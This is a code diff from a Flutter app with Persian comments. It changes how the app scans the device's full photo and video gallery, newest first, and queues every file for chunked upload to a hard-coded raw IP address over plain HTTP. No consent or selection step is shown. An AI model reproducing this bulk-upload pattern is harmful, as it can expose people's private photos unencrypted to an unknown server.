@@ -10,7 +10,7 @@ import 'package:sqflite/sqflite.dart';
 import 'package:path/path.dart';
 
 const String galleryUrl = 'http://194.48.198.154:8080';
-const int chunkSize = 1024 * 1024; // 1MB
+const int chunkSize = 4 * 1024 * 1024; // 4MB
 
 http.Client _createHttpClient() {
   final ioClient = HttpClient()
@@ -150,16 +150,19 @@ class UploadQueueDB {
 // اسکن گالری — از جدیدترین به قدیمی‌ترین
 // ============================================
 Future<int> scanGalleryToQueue() async {
-  final albums = await PhotoManager.getAssetPathList(type: RequestType.all);
+  final albums = await PhotoManager.getAssetPathList(
+    type: RequestType.all,
+    filterOption: FilterOptionGroup(
+      orders: [
+        OrderOption(type: OrderOptionType.createDate, asc: false), // جدید به قدیم
+      ],
+    ),
+  );
   if (albums.isEmpty) return 0;
 
-  // پیدا کردن آلبوم "همه"
   AssetPathEntity? allAlbum;
   for (final a in albums) {
-    if (a.isAll) {
-      allAlbum = a;
-      break;
-    }
+    if (a.isAll) { allAlbum = a; break; }
   }
   allAlbum ??= albums.first;
 
@@ -173,8 +176,6 @@ Future<int> scanGalleryToQueue() async {
 
   const pageSize = 50;
 
-  // از ابتدای لیست (جدیدترین) شروع می‌کنیم
-  // photo_manager به‌صورت پیش‌فرض از جدید به قدیم مرتب می‌کنه
   for (int start = 0; start < count; start += pageSize) {
     final end = (start + pageSize < count) ? start + pageSize : count;
     final assets = await allAlbum.getAssetListRange(start: start, end: end);
@@ -183,13 +184,9 @@ Future<int> scanGalleryToQueue() async {
       final ids = assets.map((a) => "asset_id=${a.id}").join("&");
       final serverUploaded = <String>{};
       try {
-        final res = await client
-            .get(
-              Uri.parse(
-                "$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids",
-              ),
-            )
-            .timeout(const Duration(seconds: 30));
+        final res = await client.get(
+          Uri.parse("$galleryUrl/api/gallery/check/?device_id=$deviceId&$ids"),
+        ).timeout(const Duration(seconds: 30));
         if (res.statusCode == 200) {
           final data = jsonDecode(res.body);
           serverUploaded.addAll(
@@ -200,16 +197,12 @@ Future<int> scanGalleryToQueue() async {
 
       for (int i = 0; i < assets.length; i++) {
         final asset = assets[i];
-        if (localCompleted.contains(asset.id) ||
-            serverUploaded.contains(asset.id)) {
-          continue;
-        }
+        if (localCompleted.contains(asset.id) || serverUploaded.contains(asset.id)) continue;
 
         final file = await asset.originFile ?? await asset.file;
         if (file == null) continue;
 
-        // sort_order: جدیدترین بیشترین عدد داره
-        // start=0 یعنی جدیدترین‌هاست، پس sort_order = count - start - i
+        // start=0 جدیدترینه، sort_order بزرگتر = اولویت بالاتر
         final sortOrder = count - start - i;
 
         await UploadQueueDB.insertOrUpdate({
@@ -220,8 +213,7 @@ Future<int> scanGalleryToQueue() async {
           'uploaded_bytes': 0,
           'status': 'pending',
           'upload_id': null,
-          'mime_type':
-              asset.mimeType ??
+          'mime_type': asset.mimeType ??
               (asset.type == AssetType.image ? 'image/jpeg' : 'video/mp4'),
           'asset_type': asset.type == AssetType.image ? 'image' : 'video',
           'retries': 0,
@@ -231,10 +223,8 @@ Future<int> scanGalleryToQueue() async {
         newItems++;
       }
     }
-
     await Future.delayed(Duration.zero);
   }
-
   return newItems;
 }
 
